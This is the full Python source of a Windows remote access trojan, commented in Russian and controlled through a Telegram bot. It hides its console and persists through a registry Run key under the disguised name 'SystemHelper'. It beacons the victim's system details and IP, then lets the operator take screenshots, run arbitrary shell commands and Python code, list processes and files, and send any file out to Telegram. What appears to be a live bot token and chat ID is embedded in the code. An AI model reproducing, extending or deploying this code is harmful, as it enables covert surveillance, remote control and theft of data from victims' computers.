# rat_system.py
import os
import sys
import subprocess
import tempfile
import ctypes
import winreg
import json
import base64
import threading
import time
import socket
import platform
import requests
from datetime import datetime
from PIL import ImageGrab
import pyautogui
import psutil
import telebot
import getpass
import shutil
import hashlib
import logging

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "8297207671:AAEA5B7jTxRQGDNEpsHMVKd1IwBFq3bQO5c"  # ЗАМЕНИТЕ
CHAT_ID = "7462192673"      # ЗАМЕНИТЕ
# ===============================

# Настройка логирования
logging.basicConfig(level=logging.ERROR)

class SystemRat:
    def __init__(self):
        self.token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.bot = telebot.TeleBot(self.token, threaded=False)
        self.agent_id = self.generate_id()
        self.running = True
        self.installation_path = sys.argv[0]
        
        # Запускаем бота в отдельном потоке
        self.bot_thread = threading.Thread(target=self.start_bot, daemon=True)
        self.bot_thread.start()
        
        # Запускаем периодические отчеты
        self.report_thread = threading.Thread(target=self.periodic_reports, daemon=True)
        self.report_thread.start()
        
        # Отправляем сообщение о запуске
        self.send_startup_message()
    
    def generate_id(self):
        """Генерация уникального ID агента"""
        system_info = platform.node() + getpass.getuser()
        return hashlib.md5(system_info.encode()).hexdigest()[:8]
    
    def send_telegram(self, text, photo_path=None, document_path=None):
        """Отправка сообщения в Telegram"""
        try:
            if photo_path:
                with open(photo_path, 'rb') as photo:
                    self.bot.send_photo(self.chat_id, photo, caption=text)
            elif document_path:
                with open(document_path, 'rb') as doc:
                    self.bot.send_document(self.chat_id, doc, caption=text)
            else:
                self.bot.send_message(self.chat_id, text)
            return True
        except Exception as e:
            return False
    
    def send_startup_message(self):
        """Отправка сообщения о запуске"""
        info = self.get_system_info()
        message = f"🚀 Агент активирован\n"
        message += f"ID: {self.agent_id}\n"
        message += f"Система: {info['os']}\n"
        message += f"Пользователь: {info['user']}\n"
        message += f"Компьютер: {info['hostname']}\n"
        message += f"IP: {info['ip']}\n"
        message += f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        self.send_telegram(message)
    
    def get_system_info(self):
        """Получение информации о системе"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
        except:
            hostname = "unknown"
            ip = "unknown"
        
        return {
            "agent_id": self.agent_id,
            "os": f"{platform.system()} {platform.release()}",
            "user": getpass.getuser(),
            "hostname": hostname,
            "ip": ip,
            "processor": platform.processor(),
            "python": platform.python_version(),
            "path": self.installation_path
        }
    
    def take_screenshot(self):
        """Сделать скриншот"""
        try:
            screenshot = ImageGrab.grab()
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
            screenshot.save(temp_file.name, 'JPEG', quality=85)
            temp_file.close()
            
            self.send_telegram(f"📸 Скриншот от {datetime.now()}", photo_path=temp_file.name)
            os.unlink(temp_file.name)
            return True
        except Exception as e:
            self.send_telegram(f"❌ Ошибка скриншота: {str(e)}")
            return False
    
    def execute_command(self, cmd):
        """Выполнить команду"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + "\n" + result.stderr
            
            if len(output) > 3000:
                output = output[:3000] + "\n... (сообщение обрезано)"
            
            return output
        except subprocess.TimeoutExpired:
            return "⌛ Таймаут команды (30 секунд)"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def open_program(self, path):
        """Открыть программу"""
        try:
            if os.path.exists(path):
                subprocess.Popen(path, shell=True)
                return f"✅ Программа запущена: {path}"
            else:
                # Пробуем через shell
                subprocess.Popen(path, shell=True)
                return f"⚠️ Команда выполнена (путь не проверен): {path}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def get_process_list(self):
        """Получить список процессов"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
                try:
                    p_info = proc.info
                    processes.append(f"{p_info['pid']:6} {p_info['name'][:20]:20} {p_info['memory_percent']:5.1f}%")
                except:
                    pass
            
            return "PID    Имя процесса         Память\n" + "\n".join(processes[:15])
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def list_files(self, path="."):
        """Список файлов в директории"""
        try:
            if not os.path.exists(path):
                path = "."
            
            items = os.listdir(path)
            result = f"📁 Содержимое {path}:\n"
            
            for item in items[:20]:
                full_path = os.path.join(path, item)
                if os.path.isdir(full_path):
                    result += f"[DIR]  {item}\n"
                else:
                    size = os.path.getsize(full_path)
                    result += f"[FILE] {item} ({size} байт)\n"
            
            if len(items) > 20:
                result += f"... и еще {len(items)-20} объектов"
            
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def download_file(self, file_path):
        """Отправить файл"""
        try:
            if not os.path.exists(file_path):
                return f"❌ Файл не найден: {file_path}"
            
            self.send_telegram(f"📎 Файл: {file_path}", document_path=file_path)
            return f"✅ Файл отправлен"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def periodic_reports(self):
        """Периодические отчеты"""
        while self.running:
            time.sleep(3600)  # Каждый час
            
            try:
                info = self.get_system_info()
                cpu_percent = psutil.cpu_percent()
                memory = psutil.virtual_memory()
                
                report = f"📊 Статус системы (ID: {self.agent_id})\n"
                report += f"CPU: {cpu_percent}%\n"
                report += f"RAM: {memory.percent}% ({memory.used//1024//1024}MB/{memory.total//1024//1024}MB)\n"
                report += f"Активен: {datetime.now().strftime('%H:%M:%S')}"
                
                self.send_telegram(report)
            except:
                pass
    
    def ensure_persistence(self):
        """Обеспечение персистентности"""
        try:
            # Добавляем в автозагрузку через реестр
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "SystemHelper", 0, winreg.REG_SZ, 
                                f'"{sys.executable}" "{self.installation_path}"')
        except:
            pass
    
    def start_bot(self):
        """Запуск Telegram бота"""
        @self.bot.message_handler(commands=['start', 'help'])
        def send_help(message):
            if str(message.chat.id) == self.chat_id:
                help_text = """
🤖 Доступные команды:
/info - Информация о системе
/screen - Скриншот экрана
/cmd [команда] - Выполнить команду CMD
/open [путь] - Открыть программу
/process - Список процессов
/files [путь] - Список файлов
/download [путь] - Скачать файл
/shell [код] - Выполнить Python код
/exit - Завершить работу агента
                """
                self.bot.reply_to(message, help_text)
        
        @self.bot.message_handler(commands=['info'])
        def send_info(message):
            if str(message.chat.id) == self.chat_id:
                info = self.get_system_info()
                info_text = "\n".join([f"{k}: {v}" for k, v in info.items()])
                self.bot.reply_to(message, f"📋 Информация:\n{info_text}")
        
        @self.bot.message_handler(commands=['screen'])
        def make_screenshot(message):
            if str(message.chat.id) == self.chat_id:
                self.bot.reply_to(message, "📸 Делаю скриншот...")
                self.take_screenshot()
        
        @self.bot.message_handler(commands=['cmd'])
        def execute_cmd(message):
            if str(message.chat.id) == self.chat_id:
                cmd_text = message.text[5:].strip()
                if cmd_text:
                    self.bot.reply_to(message, f"⚡ Выполняю: {cmd_text}")
                    output = self.execute_command(cmd_text)
                    self.bot.reply_to(message, f"📝 Результат:\n```\n{output}\n```", parse_mode='Markdown')
                else:
                    self.bot.reply_to(message, "📝 Использование: /cmd [команда]")
        
        @self.bot.message_handler(commands=['open'])
        def open_app(message):
            if str(message.chat.id) == self.chat_id:
                path = message.text[6:].strip()
                if path:
                    result = self.open_program(path)
                    self.bot.reply_to(message, result)
                else:
                    self.bot.reply_to(message, "📝 Использование: /open [путь_к_программе]")
        
        @self.bot.message_handler(commands=['process'])
        def show_processes(message):
            if str(message.chat.id) == self.chat_id:
                processes = self.get_process_list()
                self.bot.reply_to(message, f"📊 Процессы:\n```\n{processes}\n```", parse_mode='Markdown')
        
        @self.bot.message_handler(commands=['files'])
        def show_files(message):
            if str(message.chat.id) == self.chat_id:
                path = message.text[7:].strip()
                files_list = self.list_files(path)
                self.bot.reply_to(message, files_list)
        
        @self.bot.message_handler(commands=['download'])
        def download_file_cmd(message):
            if str(message.chat.id) == self.chat_id:
                path = message.text[10:].strip()
                if path:
                    result = self.download_file(path)
                    self.bot.reply_to(message, result)
                else:
                    self.bot.reply_to(message, "📝 Использование: /download [путь_к_файлу]")
        
        @self.bot.message_handler(commands=['shell'])
        def execute_python(message):
            if str(message.chat.id) == self.chat_id:
                code = message.text[7:].strip()
                if code:
                    try:
                        # Ограниченное выполнение кода
                        exec_globals = {}
                        exec(code, {"__builtins__": {}}, exec_globals)
                        result = str(exec_globals.get('result', 'Код выполнен'))
                        self.bot.reply_to(message, f"🐍 Результат: {result}")
                    except Exception as e:
                        self.bot.reply_to(message, f"❌ Ошибка: {str(e)}")
        
        @self.bot.message_handler(commands=['exit'])
        def exit_bot(message):
            if str(message.chat.id) == self.chat_id:
                self.bot.reply_to(message, "👋 Завершаю работу...")
                self.running = False
                os._exit(0)
        
        # Запускаем бота
        while self.running:
            try:
                self.bot.polling(none_stop=True, timeout=30)
            except Exception as e:
                time.sleep(5)

def hide_console():
    """Скрытие консоли (Windows)"""
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def main():
    """Основная функция"""
    # Скрываем консоль
    hide_console()
    
    # Устанавливаем рабочую директорию
    os.chdir(os.path.dirname(os.path.abspath(sys.argv[0])))
    
    # Запускаем ратку
    rat = SystemRat()
    
    # Обеспечиваем персистентность
    rat.ensure_persistence()
    
    # Держим программу активной
    while rat.running:
        time.sleep(1)

if __name__ == "__main__":
    main()
